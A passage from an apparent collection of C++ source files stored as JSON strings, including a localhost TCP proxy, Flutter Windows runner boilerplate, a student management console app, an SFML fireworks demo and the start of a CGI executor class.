\t\ts1.intersection(s2);\n\t\t   \t\tbreak;\n\t\t   \tcase 11:\n\t\t   \t\ts2.difference(s1);\n\t\t   \t\tbreak;\n\t\t   \tcase 12:\n\t\t   \t\tkey = s1.subset(s2);\n\t\t   \t\tif(key)\n\t\t   \t\t\tcout<<\"Set 2 is a Subset of Set 1\"<<endl;\n\t\t   \t\telse\n\t\t   \t\t\tcout<<\"Set 2 is not a Subset of Set 1\"<<endl;\n\n\t\t  \n\t\t}\n\t}while(ch != 13);\n\treturn 0;\n}\n",
    "#include \"proxy.h\"\n\nProxyServer::Socket::Socket() : sock_addr_() {\n  sockfd_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n  if (sockfd_ != -1) {\n    memset(&sock_addr_, 0, sizeof(sock_addr_));\n  }\n}\n\nProxyServer::Socket::Socket(Socket &&other) noexcept : sock_addr_() {\n  sockfd_ = other.sockfd_;\n  other.sockfd_ = -1;\n  memcpy(&sock_addr_, &other.sock_addr_, sizeof(sock_addr_));\n}\n\nProxyServer::Socket::~Socket() {\n  if (sockfd_ != -1) {\n    shutdown(sockfd_, SHUT_RDWR);\n    close(sockfd_);\n  }\n}\n\nint ProxyServer::Socket::SetBind(const std::string &address, int port) {\n  sock_addr_.sin_family = AF_INET;\n  sock_addr_.sin_port = htons(port);\n  sock_addr_.sin_addr.s_addr = inet_addr(address.c_str());\n  return bind(sockfd_, reinterpret_cast<sockaddr *>(&sock_addr_),\n              sizeof(sock_addr_));\n}\n\nint ProxyServer::Socket::SetConnect(const std::string &address, int port) {\n  sock_addr_.sin_family = AF_INET;\n  sock_addr_.sin_port = htons(port);\n  sock_addr_.sin_addr.s_addr = inet_addr(address.c_str());\n\n  return connect(sockfd_, reinterpret_cast<sockaddr *>(&sock_addr_),\n                 sizeof(sock_addr_));\n}\n\nbool ProxyServer::Socket::SetAccept(int proxy_socket) {\n  socklen_t address_length = sizeof(sock_addr_);\n  if ((sockfd_ = accept(proxy_socket, reinterpret_cast<sockaddr *>(&sock_addr_),\n                        &address_length)) == -1) {\n    std::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u043f\u0440\u0438\u043d\u044f\u0442\u044c \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435 \u043e\u0442 \u043a\u043b\u0438\u0435\u043d\u0442\u0430. \";\n  }\n  return sockfd_ != -1;\n}\n\nint ProxyServer::Socket::GetDescriptor() const { return sockfd_; }\n\nsockaddr_in ProxyServer::Socket::GetAddress() const noexcept {\n  return sock_addr_;\n}\n\nProxyServer::ProxyServer(int proxy_port) : all_sockets_(), server_state_(true) {\n  if (!CreateProxyServer(proxy_port)) {\n    server_state_ = false;\n  }\n}\n\nbool ProxyServer::CreateProxyServer(int proxy_port) {\n  Socket proxy_socket;\n  if (proxy_socket.GetDescriptor() == -1) {\n    perror(\"\\\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u043f\u0440\u043e\u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0441\u043e\u043a\u0435\u0442. (\u0421\u043e\u043a\u0435\u0442 \"\n           \"\u043f\u0440\u043e\u043a\u0441\u0438-\u0441\u0435\u0440\u0432\u0435\u0440\u0430).\\n\");\n    return false;\n  }\n\n  if (proxy_socket.SetBind(\"127.0.0.1\", proxy_port) == -1) {\n    perror(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u0440\u0438\u0432\u044f\u0437\u043a\u0435 \u0441\u043e\u043a\u0435\u0442\u0430 \u043a \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u043e\u043c\u0443 \u0430\u0434\u0440\u0435\u0441\u0443 \u0438 \u043f\u043e\u0440\u0442\u0443. (\u0421\u043e\u043a\u0435\u0442 \"\n           \"\u043f\u0440\u043e\u043a\u0441\u0438-\u0441\u0435\u0440\u0432\u0435\u0440\u0430).\\n\");\n    return false;\n  }\n\n  if (listen(proxy_socket.GetDescriptor(), SOMAXCONN) == -1) {\n    perror(\"\u041d\u0435\u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u0441\u043e\u043a\u0435\u0442 \u0432 \u0440\u0435\u0436\u0438\u043c \u043f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u043d\u0438\u044f. (\u0421\u043e\u043a\u0435\u0442 \"\n           \"\u043f\u0440\u043e\u043a\u0441\u0438-\u0441\u0435\u0440\u0432\u0435\u0440\u0430).\\n\");\n    return false;\n  }\n\n  all_sockets_.push_back(std::move(proxy_socket));\n  return true;\n}\n\nbool ProxyServer::ConnectionServer(const std::string &server_address,\n                                   int server_port) {\n  Socket server_socket;\n  if (server_socket.GetDescriptor() == -1) {\n    perror(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u043f\u0440\u043e\u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0441\u043e\u043a\u0435\u0442. (\u0421\u043e\u043a\u0435\u0442 \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \"\n           \"\u043d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f).\\n\");\n    return false;\n  }\n\n  if (server_socket.SetConnect(server_address, server_port) == -1) {\n    perror(\"\u041d\u0435\u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u043a \u0441\u0435\u0440\u0432\u0435\u0440\u0443 \u043d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f. (\u0421\u043e\u043a\u0435\u0442 \u0441\u0435\u0440\u0432\u0435\u0440\u0430 \"\n           \"\u043d\u0430\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f).\\n\");\n    return false;\n  }\n\n  all_sockets_.push_back(std::move(server_socket));\n  return true;\n}\n\nvoid ProxyServer::AcceptConnection(const std::string &server_address,\n                                   int server_port) {\n  Socket slave_socket;\n\n  if (!ConnectionServer(server_address, server_port)) {\n    std::cout << \"\u0417\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u0435 \u0440\u0430\u0431\u043e\u0442\u044b...\" << std::endl;\n  }\n\n  if (slave_socket.SetAccept(all_sockets_.front().GetDescriptor())) {\n    std::cout << \"\u0423\u0434\u0430\u043b\u043e\u0441\u044c \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c \u043a\u043b\u0438\u0435\u043d\u0442\u0430: \" << GetSocketName(slave_socket)\n              << \" \u043a \u043f\u0440\u043e\u043a\u0441\u0438-\u0441\u0435\u0440\u0432\u0435\u0440\u0443.\" << std::endl;\n    all_sockets_.push_back(std::move(slave_socket));\n  } else {\n    std::cout << GetSocketName(slave_socket) << std::endl;\n  }\n}\n\nbool ProxyServer::HandleServer(std::list<Socket>::iterator &server_iter) {\n  auto client_iter = server_iter;\n  ++client_iter;\n  char buffer[1024];\n  memset(buffer, 0, 1024);\n\n  ssize_t bytes_read;\n  if ((bytes_read = recv(server_iter->GetDescriptor(), buffer, sizeof(buffer),\n                         0)) == -1) {\n    std::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u043f\u0440\u043e\u0447\u0438\u0442\u0430\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435 \u043a\u043e\u043d\u0435\u0447\u043d\u043e\u0433\u043e \u0441\u0435\u0440\u0432\u0435\u0440\u0430.\"\n              << std::endl;\n    return false;\n  }\n\n  if (send(client_iter->GetDescriptor(), buffer, bytes_read, 0) == -1) {\n    std::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u043f\u043e\u043f\u044b\u0442\u043a\u0435 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440.\" << std::endl;\n    return false;\n  }\n\n  return true;\n}\n\nbool ProxyServer::HandleClient(std::list<Socket>::iterator &client_iter,\n                               const std::list<std::string> &keywords,\n                               std::ofstream &file) {\n  auto server_iter = client_iter;\n  --server_iter;\n  char buffer[1024];\n  memset(buffer, 0, 1024);\n\n  ssize_t bytes_read =\n      recv(client_iter->GetDescriptor(), buffer, sizeof(buffer), MSG_NOSIGNAL);\n  if (bytes_read <= 0) {\n    if (bytes_read == -1) {\n      std::cout << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0447\u0442\u0435\u043d\u0438\u0438 \u0434\u0430\u043d\u043d\u044b\u0445 \u0441 \u043a\u043b\u0438\u0435\u043d\u0442\u0430.\" << std::endl;\n    }\n    return false;\n  }\n\n  std::string words(buffer, bytes_read);\n  // \u0415\u0441\u043b\u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u043d\u0430 \u043a\u043e\u043c\u0430\u043d\u0434\u0430 \"stop;\" \u0441 \u043a\u043b\u0438\u0435\u043d\u0442\u0430 - \u0440\u0430\u0431\u043e\u0442\u0430 \u043f\u0440\u043e\u043a\u0441\u0438-\u0441\u0435\u0440\u0432\u0435\u0440\u0430\n  // \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0435\u0442\u0441\u044f;\n  if (words.find(\"stop\")",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//student management System.\r\n//all header files\r\n#include<iostream>\r\n#include<conio.h>\r\n#include<string.h>\r\n#include<iomanip>\r\n#include<windows.h>\r\n#include<fstream>\r\n#include<stdlib.h>\r\n#include<stdio.h>\r\nusing namespace std;\r\nclass student\r\n{\r\n    char name[30];\r\n    int Roll_no;\r\n    int age;\r\n    char Pname[30];\r\n    char stdn[10];\r\n    int busno;\r\n    string convert(string s)\r\n    {\r\n        for(int i=0;i<s.length();i++)\r\n        {\r\n            s[i]=toupper(s[i]);\r\n        }\r\n        return s;\r\n    }\r\npublic:\r\n    void intro(void);   // introduction of project.\r\n    void ccolor(int); //display colorful contain.\r\n    void loadingbar(void);   //simple loading bar.\r\n    void login(void); //simple login contain.\r\n    void getdata(void);   //Get all data from user.\r\n    void showdata(void);   //display all data .\r\n    void viewAlldata();     //display all data from files.\r\n    int storedata();        //store all data in a file\r\n    void searchData(char *);    //search a perticuler data.\r\n    void showsearch(void);      //display search.\r\n    void deleteData(char *);    //delete a data.\r\n    void updateData(char *);    //use to update a data.\r\n    student()\r\n    {\r\n        Roll_no=0;\r\n        age=0;\r\n        busno=0;\r\n        strcpy(name,\"no name\");\r\n        strcpy(Pname,\"no name\");\r\n        strcpy(stdn,\"not found\");\r\n    }\r\n\r\n};\r\nvoid student::ccolor(int clr){\r\n\tHANDLE  hConsole;\r\n\thConsole = GetStdHandle(STD_OUTPUT_HANDLE);\r\n\tSetConsoleTextAttribute(hConsole, clr);\r\n\r\n//the above code displays colorful background.\r\n}\r\nvoid student::loadingbar()\r\n{\r\n    for (int i=15;i<=100;i+=5)//increasing by  5 and start with 15\r\n        {\r\n        system(\"cls\");\r\n        ccolor(14);\r\n\t\tcout<<\"\\n\\n\\n\\n\\n\\n\\n\\t\\t\\t\";\r\n\t\tcout<<i<<\" %% Loading...\\n\\n\\t\\t\";\r\n\t\tcout<<\" \";\r\n\t\tfor (int j=0; j<i;j+=2){\r\n\t\t\tcout<<\" \";\r\n\t\t}\r\n\t\tSleep(50);  //sleep for 50 mile second\r\n\t\tif(i==90 || i==50 || i==96 || i==83){\r\n\t\t\tSleep(50);\r\n\t\t}\r\n\t}\r\n\tsystem(\"cls\");// clear the terminal\r\n}\r\nvoid student::intro()\r\n{\r\n    ccolor(433);\r\n    cout<<\"*****************************************************************\"<<endl\r\n        <<\"*****************************************************************\"<<endl\r\n        <<\"*************      STUDENT MONITORING SYSTEM       **************\"<<endl\r\n        <<\"*************             MADE BY MR.ASHFAQUE ALI      **********\"<<endl\r\n        <<\"*****************************************************************\"<<endl\r\n        <<\"*****************************************************************\"<<endl\r\n        <<\"_________________________________________________________________\\n\";\r\n        //simple introduction\r\n        getch();\r\n}\r\nvoid student::login()\r\n{\r\n    ccolor(14); // simple login with user_id and password\r\n    char ui[]=\"ASHFAQUE\";\r\n    char psw[]=\"3535\";\r\n    char gui[10],gpsw[10];\r\n    cout<<\"\\n\\t\\t______________________________\"<<endl\r\n        <<\"\\t\\t|ENTER USER ID:-|\";\r\n    cin>>gui;\r\n    cout<<\"\\n\\t\\t______________________________\"<<endl\r\n        <<\"\\t\\t|ENTER PASSWORD:-|\";\r\n    cin>>gpsw;\r\n    if(strcmp(ui,gui)!=0 && strcmp(psw,gpsw)==0)\r\n       {\r\n           ccolor(12);\r\n        cout<<\"\\t\\tINVALID UI AND PASSWORD:\";\r\n        getch();\r\n        exit(0);\r\n    }\r\n    else\r\n    {\r\n        cout<<\"\\t\\tLOGIN SUCSESSFULLY:-\\n\";\r\n    }\r\n}\r\nvoid student::getdata()\r\n{\r\n\r\n    fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT NAME :\";cin.getline(name,29);fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT ROLL.NO :\";cin>>Roll_no;fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT BUS NO :\";cin>>busno;fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT AGE :\";cin>>age;fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;fflush(stdin);\r\n   cout<<\"\\t* ENTER STUDENT FATHER NAME :\";cin.getline(Pname,29);fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT STANDARD :\";cin.getline(stdn,9);fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;fflush(stdin);\r\n\r\n}\r\nvoid student::showdata()\r\n{\r\n            cout<<\"\\t***************************************************\"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<endl;\r\n            cout<<\"\\t|NAME of the student is       |->    \"<<name<<\"   \"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<endl;\r\n            cout<<\"\\t|Roll.NO of the student is    |->       \"<<Roll_no<<\"          \"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<endl;\r\n            cout<<\"\\t|BUS.NO of the student is     |->       \"<<busno<<\"         \"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"asistant_bot\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include \"firework.h\"\n\nconstexpr float gravity = 500.0f;\n\nint main() {\n    sf::ContextSettings settings;\n    settings.antialiasingLevel = 8;\n\n    sf::RenderWindow window(sf::VideoMode(1600, 900), \"SpaceBar to clear screen\", sf::Style::Close, settings);\n    window.setFramerateLimit(120);\n\n    sf::Font font;\n    font.loadFromFile(\"OpenSans-Regular.ttf\");\n\n    sf::Text fpsText;\n    fpsText.setFont(font);\n    fpsText.setCharacterSize(36); \n    fpsText.setFillColor(sf::Color::Red);\n    fpsText.setPosition(10, 10);\n\n    sf::Event event;\n\n    sf::Clock fpsClock;\n    unsigned int frameCount = 0;\n    sf::Clock deltaClock;\n    float dt = 1.0f / 60.0f; // 1/60 seconds\n\n    //this is to render texture for the fireworks\n    sf::RenderTexture fadeTexture;\n    fadeTexture.create(1600, 900);\n\n    sf::CircleShape blastBoom; // this represents the blast\n    blastBoom.setRadius(50);\n    blastBoom.setPointCount(100);\n\n    std::vector<Firework> Fireworks; // store alr drawn fireworks\n    std::vector<Firework> FireWorksAftermath; // store the effects of splash\n\n    bool MousePressed = false;\n    bool SpacePressed = false;\n\n    while (window.isOpen()) {\n        while (window.pollEvent(event)) {\n            switch (event.type) {\n            case sf::Event::Closed:\n                window.close();\n                break;\n            case sf::Event::MouseButtonPressed:\n                if (event.mouseButton.button == sf::Mouse::Left) {\n                    sf::Vector2f mousePos(sf::Mouse::getPosition(window)); //mouse pos relative to current active window\n\n                    Fireworks.emplace_back\n                    (\n                        (float)randomInt(12, 16),\n                        sf::Vector2f(mousePos.x, mousePos.y), //  use mouse position without offset\n                        sf::Vector2f{},\n                        sf::Color((sf::Uint8)randomInt(120, 255), (sf::Uint8)randomInt(120, 255), (sf::Uint8)randomInt(120, 255))\n                    );\n\n                    MousePressed = true;\n                }\n                break; //these needs to go both ways\n            case sf::Event::KeyPressed:\n                if (event.key.code == sf::Keyboard::Space) {\n                    Fireworks.clear();\n                    FireWorksAftermath.clear();\n                    fadeTexture.clear();\n                    SpacePressed = true; \n                }\n                break;\n            case sf::Event::KeyReleased:\n                if (event.key.code == sf::Keyboard::Space) {\n                    SpacePressed = false; \n                }\n                break;\n            }\n        }\n\n        window.clear();\n\n        if (!SpacePressed) {\n            static float fadeElapsedTime = 0.0f;\n            fadeElapsedTime += dt;\n\n            if (!Fireworks.empty()) { //if not empty we loop and continusely draw\n                for (size_t i = 0; i < Fireworks.size(); i++) {\n                    auto& current = Fireworks[i];\n\n                    current.Velocity.y += gravity * dt;\n\n                    if (current.Velocity.y > 0.0f) {\n                        createExplosion(FireWorksAftermath, current);\n\n                        Fireworks.erase(Fireworks.begin() + i);\n                        i--;\n                        continue;\n                    }\n\n                    current.Position += current.Velocity * dt;\n\n                    blastBoom.setRadius(current.Radius);\n                    blastBoom.setFillColor(current.Color);\n                    blastBoom.setOrigin(sf::Vector2f(current.Radius, current.Radius));\n                    blastBoom.setPosition(current.Position);\n\n                    fadeTexture.draw(blastBoom);\n                }\n            }\n\n            for (size_t i = 0; i < FireWorksAftermath.size(); i++) { // this is for the blast effect\n                auto& current = FireWorksAftermath[i];\n\n                current.Velocity.y += gravity * dt;\n\n                current.Position += current.Velocity * dt;\n\n                current.Radius -= 10.0f * dt;\n                if (current.Radius <= 1.0f) {\n                    FireWorksAftermath.erase(FireWorksAftermath.begin() + i);\n                    i--;\n                    continue;\n                }\n\n                blastBoom.setRadius(current.Radius);\n                blastBoom.setFillColor(current.Color);\n                blastBoom.setOrigin(sf::Vector2f(current.Radius, current.Radius));\n                blastBoom.setPosition(current.Position);\n\n                fadeTexture.draw(blastBoom);\n            }\n\n            fadeTexture.display();\n\n            window.draw(sf::Sprite(fadeTexture.getTexture()));\n        }\n\n        //this is for fps kinda whack imo\n        frameCount++;\n        if (fpsClock.getElapsedTime().asSeconds() >= 1.0f) {\n            float fps = static_cast<float>(frameCount) / fpsClock.restart().asSeconds();\n            fpsText.setString(\"FPS: \" + std::to_string(static_cast<int>(fps)));\n\n            frameCount = 0;\n        }\n        window.draw(fpsText);\n\n        window.display();\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"api\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   CGIexec.cpp                                        :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: bjimenez <bjimenez@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2023/11/25 19:14:34 by jaromero          #+#    #+#             */\n/*   Updated: 2023/12/05 14:26:29 by bjimenez         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"CGIexec.hpp\"\n\n\nCGIexec::CGIexec(void)\n{\n    this->cgi_type.clear();\n    this->cgi_path.clear();\n    this->output.clear();\n    this->nbr_arg = 0;\n    this->args = 0;\n    this->execState = false;\n}\n\nCGIexec::CGIexec(CGIexec const &copy)\n{\n    *this = copy;\n}\n\nCGIexec::CGIexec(CFGlocation* location, std::string _type, std::string exec, std::map<std::string, std::string> _args)\n{\n    this->execState = false;\n    if (location == NULL)\n    {\n        this->output = \"Undefined CGI config!!\\n\";\n        return ;\n    }\n    this->SetNumberArguments(_args);\n    if (location->getCGIpass() != \"\")\n    {\n        std::cout << \"location: \" << location->getCGIpass() << std::endl;\n        this->SetType(location->getCGIpass(), _type);\n    }\n    else\n    {\n        this->output =  \"CGI interpreter not found\\n\";\n        return ;\n    }\n    this->SetArguments(_args, exec);\n    this->execState = true;\n    this->ExecCGI();\n}\n\nCGIexec::~CGIexec(void)\n{\n   